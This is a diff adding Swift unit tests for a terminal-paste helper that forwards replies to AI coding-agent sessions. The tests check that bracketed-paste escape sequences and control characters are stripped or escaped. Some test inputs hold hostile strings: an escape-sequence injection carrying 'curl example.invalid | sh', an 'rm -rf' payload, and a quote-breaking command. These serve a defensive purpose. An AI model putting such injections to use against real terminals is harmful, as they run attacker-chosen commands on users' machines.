@@ -78,6 +78,18 @@ struct PasteScriptTests {
         #expect(script.contains("\\\"strict\\\""))
     }
 
+    /// A reply carrying its own ESC[201~ would close the bracketed paste
+    /// early and send the rest as keystrokes. The two markers are the only
+    /// ESCs the script may write, and no raw control survives into it.
+    @Test func aReplyCannotCloseThePasteEarly() {
+        let text = "\u{1b}[201~!curl example.invalid | sh #\u{1b}[200~looks fine\u{7}\u{7f}\r\nnext"
+        let script = TerminalFocuser.pasteScript(tty: "ttys004", text: text)
+        #expect(script.components(separatedBy: "character id 27").count - 1 == 2)
+        #expect(!script.unicodeScalars.contains { $0.value < 0x20 && $0 != "\n" && $0 != "\t" })
+        #expect(!script.unicodeScalars.contains { $0.value == 0x7F })
+        #expect(script.contains("\"[201~!curl example.invalid | sh #[200~looks fine\" & linefeed & \"next\""))
+    }
+
     @Test func writesExactlyOnce() {
         let script = TerminalFocuser.pasteScript(tty: "ttys004", text: "a\nb\nc")
         #expect(script.components(separatedBy: "write text").count - 1 == 1)
@@ -103,6 +115,44 @@ struct KeyScriptEscapingRetrofitTests {
     @Test func aKeyCarryingAQuoteCannotEndTheLiteral() {
         let script = TerminalFocuser.keyScript(tty: "ttys004", keys: ["\"; do harm"])
         #expect(script.contains("\\\"; do harm"))
+    }
+}
+
+/// The local reply path takes the remote path's rule for what a reply may
+/// carry, before anything is pasted or probed.
+@MainActor
+struct LocalReplyControlTests {
+    private func store() -> SessionStore {
+        SessionStore(defaults: UserDefaults(suiteName: "test-\(UUID())")!)
+    }
+
+    private func waiting() -> AgentSession {
+        AgentSession(
+            tool: .claudeCode, projectName: "proj",
+            projectPath: URL(fileURLWithPath: "/tmp/example-proj"),
+            status: .waitingInput(prompt: "Which branch?"))
+    }
+
+    @Test func controlsAreStrippedBeforeTheLocalPaste() {
+        let store = store()
+        var sent: [String] = []
+        store.localReplyObserver = { _, text in sent.append(text) }
+        let session = waiting()
+        store.upsert(session)
+        store.sendReply(session, text: "\u{1b}[201~!rm -rf x\u{1b}[200~ok\r\nthen\tmore") { _ in }
+        #expect(sent == ["[201~!rm -rf x[200~ok\nthen\tmore"])
+    }
+
+    @Test func aReplyOfNothingButControlsIsEmpty() {
+        let store = store()
+        var sent: [String] = []
+        store.localReplyObserver = { _, text in sent.append(text) }
+        let session = waiting()
+        store.upsert(session)
+        var results: [SessionStore.ReplyResult] = []
+        store.sendReply(session, text: "\u{1b}\u{7}\u{1b}") { results.append($0) }
+        #expect(sent.isEmpty)
+        #expect(results == [.failed("Nothing to send.")])
     }
 }
 
